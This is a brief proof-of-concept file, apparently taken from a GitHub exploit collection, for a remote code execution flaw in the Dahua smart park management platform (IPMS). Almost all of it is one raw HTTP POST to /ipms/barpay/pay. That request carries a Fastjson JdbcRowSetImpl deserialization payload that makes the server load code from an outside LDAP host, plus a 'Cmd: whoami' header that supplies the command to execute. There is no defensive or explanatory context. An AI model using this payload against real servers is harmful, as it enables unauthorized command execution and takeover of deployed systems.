# dahua_ipms_rce
from: https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ipms%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

2024.5.6 @2

```
POST /ipms/barpay/pay HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cmd: whoami
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 104

{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://gobygo.net/A4", "autoCommit": true}
```
